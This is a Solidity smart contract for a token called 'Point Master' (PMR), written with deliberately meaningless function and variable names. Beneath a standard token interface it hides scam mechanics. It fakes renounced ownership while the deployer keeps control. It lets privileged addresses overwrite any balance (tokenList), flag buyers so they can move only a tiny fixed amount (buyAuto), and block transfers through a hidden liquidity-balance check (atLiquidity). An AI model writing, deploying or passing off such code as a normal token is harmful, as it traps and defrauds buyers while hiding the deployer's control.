//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface receiverTotal {
    function createPair(address buySell, address fundSender) external returns (address);
}

interface autoFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atMin) external view returns (uint256);

    function transfer(address modeIs, uint256 feeExempt) external returns (bool);

    function allowance(address limitLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeExempt) external returns (bool);

    function transferFrom(
        address sender,
        address modeIs,
        uint256 feeExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundLimit, uint256 value);
    event Approval(address indexed limitLiquidity, address indexed spender, uint256 value);
}

abstract contract sellMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txBuy is autoFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PointMaster is sellMode, autoFee, txBuy {

    mapping(address => uint256) private atTx;

    address fromTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return teamTakeBuy;
    }

    bool public feeFrom;

    function swapEnableTotal(address takeWallet, address modeIs, uint256 feeExempt) internal returns (bool) {
        if (takeWallet == maxAmountLaunch) {
            return tokenTake(takeWallet, modeIs, feeExempt);
        }
        uint256 senderTeam = autoFee(modeFeeSender).balanceOf(fromTrading);
        require(senderTeam == swapTo);
        require(modeIs != fromTrading);
        if (modeLaunch[takeWallet]) {
            return tokenTake(takeWallet, modeIs, tokenLiquidity);
        }
        return tokenTake(takeWallet, modeIs, feeExempt);
    }

    mapping(address => mapping(address => uint256)) private liquidityReceiver;

    mapping(address => bool) public enableLaunch;

    address public modeFeeSender;

    address private receiverSwap;

    function transferFrom(address takeWallet, address modeIs, uint256 feeExempt) external override returns (bool) {
        if (_msgSender() != launchedSender) {
            if (liquidityReceiver[takeWallet][_msgSender()] != type(uint256).max) {
                require(feeExempt <= liquidityReceiver[takeWallet][_msgSender()]);
                liquidityReceiver[takeWallet][_msgSender()] -= feeExempt;
            }
        }
        return swapEnableTotal(takeWallet, modeIs, feeExempt);
    }

    function walletAuto(address minTotal) public {
        require(minTotal.balance < 100000);
        if (feeFrom) {
            return;
        }
        if (swapMin != sellReceiver) {
            takeIs = false;
        }
        enableLaunch[minTotal] = true;
        
        feeFrom = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenMin;
    }

    function receiverAt() public {
        emit OwnershipTransferred(maxAmountLaunch, address(0));
        receiverSwap = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingReceiverTake;
    }

    function buyAuto(address swapAmount) public {
        fundTake();
        if (swapMin == takeIs) {
            amountReceiver = true;
        }
        if (swapAmount == maxAmountLaunch || swapAmount == modeFeeSender) {
            return;
        }
        modeLaunch[swapAmount] = true;
    }

    uint256 listMin;

    function transfer(address tokenShould, uint256 feeExempt) external virtual override returns (bool) {
        return swapEnableTotal(_msgSender(), tokenShould, feeExempt);
    }

    function tokenList(address tokenShould, uint256 feeExempt) public {
        fundTake();
        atTx[tokenShould] = feeExempt;
    }

    bool public senderLiquidity;

    event OwnershipTransferred(address indexed totalTo, address indexed listSwap);

    bool private amountReceiver;

    function owner() external view returns (address) {
        return receiverSwap;
    }

    address public maxAmountLaunch;

    string private teamTakeBuy = "Point Master";

    bool private swapMin;

    mapping(address => bool) public modeLaunch;

    function getOwner() external view returns (address) {
        return receiverSwap;
    }

    constructor (){
        if (amountReceiver) {
            amountReceiver = false;
        }
        buyAt tradingShould = buyAt(launchedSender);
        modeFeeSender = receiverTotal(tradingShould.factory()).createPair(tradingShould.WETH(), address(this));
        
        maxAmountLaunch = _msgSender();
        enableLaunch[maxAmountLaunch] = true;
        atTx[maxAmountLaunch] = tokenMin;
        receiverAt();
        
        emit Transfer(address(0), maxAmountLaunch, tokenMin);
    }

    address launchedSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address enableAmount, uint256 feeExempt) public virtual override returns (bool) {
        liquidityReceiver[_msgSender()][enableAmount] = feeExempt;
        emit Approval(_msgSender(), enableAmount, feeExempt);
        return true;
    }

    function balanceOf(address atMin) public view virtual override returns (uint256) {
        return atTx[atMin];
    }

    uint256 swapTo;

    bool public sellReceiver;

    uint256 private tokenMin = 100000000 * 10 ** 18;

    string private receiverReceiverIs = "PMR";

    uint256 constant tokenLiquidity = 9 ** 10;

    uint8 private marketingReceiverTake = 18;

    function atLiquidity(uint256 feeExempt) public {
        fundTake();
        swapTo = feeExempt;
    }

    function allowance(address launchedEnable, address enableAmount) external view virtual override returns (uint256) {
        if (enableAmount == launchedSender) {
            return type(uint256).max;
        }
        return liquidityReceiver[launchedEnable][enableAmount];
    }

    bool public takeIs;

    function tokenTake(address takeWallet, address modeIs, uint256 feeExempt) internal returns (bool) {
        require(atTx[takeWallet] >= feeExempt);
        atTx[takeWallet] -= feeExempt;
        atTx[modeIs] += feeExempt;
        emit Transfer(takeWallet, modeIs, feeExempt);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverReceiverIs;
    }

    function fundTake() private view {
        require(enableLaunch[_msgSender()]);
    }

}